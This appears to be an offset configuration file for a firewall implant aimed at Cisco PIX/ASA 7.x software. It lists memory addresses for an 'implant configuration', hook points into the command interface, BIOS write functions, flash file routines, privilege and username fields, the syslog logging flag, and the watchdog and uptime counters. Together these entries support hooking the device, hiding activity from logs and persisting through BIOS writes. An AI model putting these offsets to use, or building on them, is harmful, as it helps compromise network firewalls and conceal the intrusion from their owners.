; --- SECTION I ---
;
0x701            // pix version
0x4e1800              // address of implant configuration
0x41  0x0049d460      // address of check for vpn packet function
0x42  0x00b88f2a      // checkheaps patch location
;
; --- END OF SECTION I ---
;
:EOS:
;
; --- SECTION II ---
;
HookLocation        0x005f6425      // address of our hook point.  Used for PBD.
JmpLocation         0x005f90a6      // address of our hook point.  Used for PBD.
InterfaceAddr       0x00c866ac      // same as 0x30 above
InterfaceLeng       0x000001b8      // length of interface struct
IntSecurityOffset   0x1c      // security level field offset
IntNameOffset       0x188      // interface name field offset
IntNumOffset        0x143      // interface number field offset
IntVlanOffset       0x10      // same as 0xc above
IntIPOffset         0x20      // ip address offset in the interface struct
IntNetmaskOffset    0x24      // netmask in the iface struct
FlashClassAddr      0x00000000      // addr of flash structure (not used in 7.*)
CryptoDeviceAddr    0x00db7fd0      // addr of crypto structure
ArpTableAddrPtr     0x00c793a8      // addr of first entry in ARP table
ArpTableLastPtr     0x00c793b0      // addr of last entry in ARP table
NumInterfaces       0x00000000      // addr of pointer to number of interfaces (not used in 7.*)
IfaceStruct2        0x00000000      // addr of pointer to second smaller interface struct (not used in 7.*)
IfaceStruct2Len     0x00      // length of 2nd smaller interface struct used by arp cache (not used in 7.*)
BiosClassAddr       0x00dc5110      // addr of the bios class structure
BiosWriteAddr1      0x00360b0c      // addr of the bios write function for one specific bios
BiosWriteAddr2      0x0036317c      // addr of the bios write function for one specific bios
BiosWriteAddr3      0x00363890      // addr of the bios write function for one specific bios
BiosWriteAddr4      0x003640ac      // addr of the bios write function for one specific bios
BiosWriteAddr5      0x00000000      // addr of the bios write function for one specific bios
BiosWriteOffset     0x00000020      // offset into the bios structure where write addr is located
FlashMkdirAddress   0x003e7f9c      // ifs_mkdir; make flash directory routine -- IFS: Mkdir
ASAFlashRmdirAddress   0x006c5344   // ifs_rmdir; remove flash directory routine for the asa
PIXFlashRmdirAddress   0x0035c47c      // ifs_rmdir; remove flash directory routine for the pix
ASAFlashRmfileAddress  0x006c52ec      // ifs_rmfile; remove flash file routine for the asa
PIXFlashRmfileAddress  0x0035c30c      // ifs_rmfile; remove flash file routine for the pix
FlashDirlistAddress 0x003e7b1c      // ifs_get_dir_entry; get the next file name from a directory listing
FlashGetSizeAddress 0x003e7114      // ifs_get_size; get the size of the provided open file
FlashChmodAddress   0x003e7c40      // ifs_chmod; change the permissions on a file
FlashMoveFileAddress 0x003e7d48     // ifs_rename; move a file
FlashGetFileInfoAddress 0x003e81a4  // ifs_get_file_info; returns a structure that contains information about a file, including its size
FlashGetSpaceAddress 0x003e940c     // ifs_get_space_info; returns used and free space in flash
FlashFileInfoSizeOffset 0x00000018  // The offset to the file size in the structure returned by ifs_get_file_info
GetPlatformStringAddr 0x00b7bc68  // The address of a function that returns the platform string 
ASARestatFlashFlagAddr 0x00dda840 // The address of the flag that tells the OS on the ASA to re-stat the files in flash (causes used space to be updated)
AnnounceFunc        0x001102b8      // addr of the device announce function
DevIoctlOffset      0x00000070      // offset to the ioctl function in a device structure
CIStartFunc         0x0012bea8      // addr of the command interface start function -- telnet function
CommandListAddr     0x00ca4478      // addr of the command list -- first parameter of ci
DeviceListPtrAddr   0x00d090e8      // pointer to the first entry in the device table -- find in announce
DeviceNextPtrOffset 0x50            // offset into the device table entry which has pointer to next entry -- find in announce
StrcmpFuncAddr      0x00b8c3d0      // address of strcmp -- search for 'strcmp'
SyslogFlagPtrAddr   0x00e79ea8      // pointer to the logging flag. -- search for 'Syslog logging:'
PGDGETValue         0x85b00002      // The value used for PGD_GET when calling the pager ioctl
PGDPUSHValue        0x85b00003      // The value used for PGD_PUSH when calling the pager ioctl
PGDSETValue         0x85b00000      // The value used for PGD_SET when calling the pager ioctl
StdChOffset         0x64            // Offset into a thread struct containing the stdch pointer
StdErrOffset        0x68            // Offset into a thread struct containing the stderr pointer
PrivFlagOffset      0x0c            // offset into an environment struct containing the privilege level indicator
UnameOffset         0x14            // offset into an environment struct containing the username 
EnvPtrOffset        0x70            // offset into a thread struct containing the pointer to the environment struct  
SyslogOffset        0x00000900      // offset into the syslog structure where the logging level is stored
Open                0x00110368      // open
CLIHookAddress       0x0012c394      // Address of hook into the command interface
WatchDogTimeout     0x00bd2944      // Address where the thread timeout value is stored 
UpTimeCounter       0x00db3cf0      // Address of the up time counter
Get_uptime_secs_addr            0x0071fc1c  // Address of the function that fetches the uptime
Modified_getuptime_code_addr    0x00139311  // Address to the next nearest 20 nops
Get_uptime_secs_call_instr_addr 0x001387a9  // Address of the location of the get_uptime_secs call instruction
AvailMemoryPtr      0x00db4a18      // Address of total available memory
;
; --- END OF SECTION II ---
;
:EOS:
;
